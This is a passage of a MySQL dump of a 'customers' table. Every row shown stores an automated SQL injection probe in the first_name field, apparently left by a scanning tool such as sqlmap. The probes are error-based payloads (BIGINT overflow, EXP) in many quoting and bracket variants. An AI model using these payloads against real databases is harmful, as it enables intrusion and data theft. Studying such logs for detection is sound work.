(490, 'wtaG', '', 'Fvmz\" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND \"NxxE\" LIKE \"NxxE', ''),
(491, 'wtaG', '', 'Fvmz\") WHERE 3283=3283 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- wvRf', ''),
(492, 'wtaG', '', 'Fvmz\" WHERE 4167=4167 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- BwSE', ''),
(493, 'wtaG', '', 'Fvmz||(SELECT 0x57427841 FROM DUAL WHERE 9377=9377 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))||', ''),
(494, 'wtaG', '', 'Fvmz||(SELECT 0x54454742 WHERE 6357=6357 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))||', ''),
(495, 'wtaG', '', 'Fvmz+(SELECT 0x62456669 WHERE 5896=5896 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))+', ''),
(496, 'wtaG', '', 'Fvmz\")) AS wyqt WHERE 4805=4805 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- GjEY', ''),
(497, 'wtaG', '', 'Fvmz\") AS YgRb WHERE 4927=4927 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- qNzb', ''),
(498, 'wtaG', '', 'Fvmz\"=\"Fvmz\" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND \"Fvmz\"=\"Fvmz', ''),
(499, 'wtaG', '', 'Fvmz) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- wKmF', ''),
(500, 'wtaG', '', 'Fvmz) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (9265=9265', ''),
(501, 'wtaG', '', 'Fvmz)) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((7095=7095', ''),
(502, 'wtaG', '', 'Fvmz))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((4096=4096', ''),
(503, 'wtaG', '', 'Fvmz AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))', ''),
(504, 'wtaG', '', 'Fvmz AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- QVTq', ''),
(505, 'wtaG', '', 'Fvmz AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))# EqsN', ''),
(506, 'wtaG', '', 'Fvmz) WHERE 2467=2467 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- lEJo', ''),
(507, 'wtaG', '', 'Fvmz WHERE 6829=6829 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- dhEV', ''),
(508, 'wtaG', '', 'Fvmz+(SELECT qvNx WHERE 1935=1935 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))+', ''),
(509, 'wtaG', '', 'Fvmz)) AS kQvP WHERE 1222=1222 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- AZGs', ''),
(510, 'wtaG', '', 'Fvmz) AS hhpj WHERE 7790=7790 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- SfAo', ''),
(511, 'wtaG', '', 'Fvmz` WHERE 8096=8096 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- STWu', ''),
(512, 'wtaG', '', 'Fvmz`) WHERE 6497=6497 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- yhbV', ''),
(513, 'wtaG', '', 'Fvmz`=`Fvmz` AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND `Fvmz`=`Fvmz', ''),
(514, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 1501=1501 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(5083=5083,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))|[Fvmz', ''),
(515, 'wtaG', '', 'Fvmz\" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- cSRx', ''),
(516, 'wtaG', '', 'Fvmz\") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (\"IslJ\"=\"IslJ', ''),
(517, 'wtaG', '', 'Fvmz\")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((\"kaRW\"=\"kaRW', ''),
(518, 'wtaG', '', 'Fvmz\"))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((\"YQFP\"=\"YQFP', ''),
(519, 'wtaG', '', 'Fvmz\" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND \"QXlh\"=\"QXlh', ''),
(520, 'wtaG', '', 'Fvmz\") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (\"xMKm\" LIKE \"xMKm', ''),
(521, 'wtaG', '', 'Fvmz\")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((\"UrLB\" LIKE \"UrLB', ''),
(522, 'wtaG', '', 'Fvmz\"))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((\"MlYz\" LIKE \"MlYz', ''),
(523, 'wtaG', '', 'Fvmz\" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND \"oUTP\" LIKE \"oUTP', ''),
(524, 'wtaG', '', 'Fvmz\") WHERE 5957=5957 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- EYEG', ''),
(525, 'wtaG', '', 'Fvmz\" WHERE 2993=2993 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- zSEL', ''),
(526, 'wtaG', '', 'Fvmz||(SELECT 0x566b4361 FROM DUAL WHERE 5594=5594 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))||', ''),
(527, 'wtaG', '', 'Fvmz||(SELECT 0x69516372 WHERE 5208=5208 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))||', ''),
(528, 'wtaG', '', 'Fvmz+(SELECT 0x5a485844 WHERE 9413=9413 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))+', ''),
(529, 'wtaG', '', 'Fvmz\")) AS HCmC WHERE 9497=9497 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- Qagt', ''),
(530, 'wtaG', '', 'Fvmz\") AS OkZO WHERE 2905=2905 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- hDmX', ''),
(531, 'wtaG', '', 'Fvmz\"=\"Fvmz\" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND \"Fvmz\"=\"Fvmz', ''),
(532, 'wtaG', '', 'Fvmz) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- jcmB', ''),
(533, 'wtaG', '', 'Fvmz) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (3939=3939', ''),
(534, 'wtaG', '', 'Fvmz)) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((4106=4106', ''),
(535, 'wtaG', '', 'Fvmz))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((1184=1184', ''),
(536, 'wtaG', '', 'Fvmz OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))', ''),
(537, 'wtaG', '', 'Fvmz OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- uYOF', ''),
(538, 'wtaG', '', 'Fvmz OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))# JqFY', '');
INSERT INTO `customers` (`id`, `username`, `password`, `first_name`, `last_name`) VALUES
(539, 'wtaG', '', 'Fvmz) WHERE 3556=3556 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- VJuG', ''),
(540, 'wtaG', '', 'Fvmz WHERE 6568=6568 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- KDcQ', ''),
(541, 'wtaG', '', 'Fvmz+(SELECT IWXq WHERE 2840=2840 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))+', ''),
(542, 'wtaG', '', 'Fvmz)) AS dbtr WHERE 6902=6902 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- POOc', ''),
(543, 'wtaG', '', 'Fvmz) AS Cumt WHERE 6990=6990 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- rnZD', ''),
(544, 'wtaG', '', 'Fvmz` WHERE 2052=2052 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- mmnH', ''),
(545, 'wtaG', '', 'Fvmz`) WHERE 2766=2766 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610)))-- XHQc', ''),
(546, 'wtaG', '', 'Fvmz`=`Fvmz` OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))) AND `Fvmz`=`Fvmz', ''),
(547, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 2770=2770 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(2497=2497,1))),0x7171787671,0x78))s), 8446744073709551610, 8446744073709551610))))|[Fvmz', ''),
(548, 'wtaG', '', 'Fvmz\" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- Xlgd', ''),
(549, 'wtaG', '', 'Fvmz\") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND (\"Cysl\"=\"Cysl', ''),
(550, 'wtaG', '', 'Fvmz\")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND ((\"rQiV\"=\"rQiV', ''),
(551, 'wtaG', '', 'Fvmz\"))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND (((\"PAMh\"=\"PAMh', ''),
(552, 'wtaG', '', 'Fvmz\" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND \"BKyz\"=\"BKyz', ''),
(553, 'wtaG', '', 'Fvmz\") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND (\"iyTv\" LIKE \"iyTv', ''),
(554, 'wtaG', '', 'Fvmz\")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND ((\"IEYg\" LIKE \"IEYg', ''),
(555, 'wtaG', '', 'Fvmz\"))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND (((\"bKSf\" LIKE \"bKSf', ''),
(556, 'wtaG', '', 'Fvmz\" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND \"ttwd\" LIKE \"ttwd', ''),
(557, 'wtaG', '', 'Fvmz\") WHERE 8287=8287 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- MdZD', ''),
(558, 'wtaG', '', 'Fvmz\" WHERE 3209=3209 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- RGjN', ''),
(559, 'wtaG', '', 'Fvmz||(SELECT 0x79646d52 FROM DUAL WHERE 8566=8566 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)))||', ''),
(560, 'wtaG', '', 'Fvmz||(SELECT 0x78454e69 WHERE 2879=2879 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)))||', ''),
(561, 'wtaG', '', 'Fvmz+(SELECT 0x4a475064 WHERE 5833=5833 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)))+', ''),
(562, 'wtaG', '', 'Fvmz\")) AS ywuc WHERE 2354=2354 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- ZkLo', ''),
(563, 'wtaG', '', 'Fvmz\") AS dSLD WHERE 1059=1059 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- vEQU', ''),
(564, 'wtaG', '', 'Fvmz\"=\"Fvmz\" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND \"Fvmz\"=\"Fvmz', ''),
(565, 'wtaG', '', 'Fvmz) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- Onik', ''),
(566, 'wtaG', '', 'Fvmz) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND (9346=9346', ''),
(567, 'wtaG', '', 'Fvmz)) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND ((6843=6843', ''),
(568, 'wtaG', '', 'Fvmz))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND (((3686=3686', ''),
(569, 'wtaG', '', 'Fvmz AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))', ''),
(570, 'wtaG', '', 'Fvmz AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- sOUJ', ''),
(571, 'wtaG', '', 'Fvmz AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))# vxVE', ''),
(572, 'wtaG', '', 'Fvmz) WHERE 9810=9810 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- dTsi', ''),
(573, 'wtaG', '', 'Fvmz WHERE 4460=4460 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- HVTW', ''),
(574, 'wtaG', '', 'Fvmz+(SELECT EFRV WHERE 4622=4622 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)))+', ''),
(575, 'wtaG', '', 'Fvmz)) AS Yxtz WHERE 4704=4704 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- NPeF', ''),
(576, 'wtaG', '', 'Fvmz) AS YuzR WHERE 3282=3282 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- boxK', ''),
(577, 'wtaG', '', 'Fvmz` WHERE 5222=5222 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- sfKg', ''),
(578, 'wtaG', '', 'Fvmz`) WHERE 9656=9656 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x))-- aBDg', ''),
(579, 'wtaG', '', 'Fvmz`=`Fvmz` AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)) AND `Fvmz`=`Fvmz', ''),
(580, 'wtaG', '', 'Fvmz]-(SELECT 0 WHERE 7692=7692 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(1518=1518,1))),0x7171787671,0x78))x)))|[Fvmz', ''),
(581, 'wtaG', '', 'Fvmz\" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- XMte', ''),
(582, 'wtaG', '', 'Fvmz\") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND (\"jkgN\"=\"jkgN', ''),
(583, 'wtaG', '', 'Fvmz\")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND ((\"RmlE\"=\"RmlE', ''),
(584, 'wtaG', '', 'Fvmz\"))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND (((\"IDwx\"=\"IDwx', ''),
(585, 'wtaG', '', 'Fvmz\" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND \"GvCG\"=\"GvCG', ''),
(586, 'wtaG', '', 'Fvmz\") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND (\"jhXr\" LIKE \"jhXr', ''),
(587, 'wtaG', '', 'Fvmz\")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND ((\"jGQO\" LIKE \"jGQO', ''),
(588, 'wtaG', '', 'Fvmz\"))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND (((\"qiGU\" LIKE \"qiGU', ''),
(589, 'wtaG', '', 'Fvmz\" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND \"JeBS\" LIKE \"JeBS', ''),
(590, 'wtaG', '', 'Fvmz\") WHERE 6185=6185 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- vwGS', ''),
(591, 'wtaG', '', 'Fvmz\" WHERE 2410=2410 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- ZicI', ''),
(592, 'wtaG', '', 'Fvmz||(SELECT 0x64595a6d FROM DUAL WHERE 1411=1411 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)))||', ''),
(593, 'wtaG', '', 'Fvmz||(SELECT 0x56527561 WHERE 3734=3734 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)))||', ''),
(594, 'wtaG', '', 'Fvmz+(SELECT 0x43646c57 WHERE 5806=5806 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)))+', ''),
(595, 'wtaG', '', 'Fvmz\")) AS bqsa WHERE 6500=6500 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- vDWP', ''),
(596, 'wtaG', '', 'Fvmz\") AS fxfb WHERE 9318=9318 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- eTOD', ''),
(597, 'wtaG', '', 'Fvmz\"=\"Fvmz\" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND \"Fvmz\"=\"Fvmz', ''),
(598, 'wtaG', '', 'Fvmz) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- RZeL', ''),
(599, 'wtaG', '', 'Fvmz) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND (3327=3327', ''),
(600, 'wtaG', '', 'Fvmz)) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND ((1185=1185', ''),
(601, 'wtaG', '', 'Fvmz))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND (((7899=7899', ''),
(602, 'wtaG', '', 'Fvmz OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))', ''),
(603, 'wtaG', '', 'Fvmz OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- RUUg', ''),
(604, 'wtaG', '', 'Fvmz OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))# kTCu', ''),
(605, 'wtaG', '', 'Fvmz) WHERE 7008=7008 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- eUFq', ''),
(606, 'wtaG', '', 'Fvmz WHERE 4041=4041 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- guzB', ''),
(607, 'wtaG', '', 'Fvmz+(SELECT rjkq WHERE 2065=2065 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)))+', ''),
(608, 'wtaG', '', 'Fvmz)) AS NVuF WHERE 9141=9141 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- ikOq', ''),
(609, 'wtaG', '', 'Fvmz) AS sYnq WHERE 9891=9891 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- aoqU', ''),
(610, 'wtaG', '', 'Fvmz` WHERE 6469=6469 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- uYDh', ''),
(611, 'wtaG', '', 'Fvmz`) WHERE 8203=8203 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x))-- BGiJ', ''),
(612, 'wtaG', '', 'Fvmz`=`Fvmz` OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171767871,(SELECT (ELT(8176=8176,1))),0x7171787671,0x78))x)) AND `Fvmz`=`Fvmz', ''),
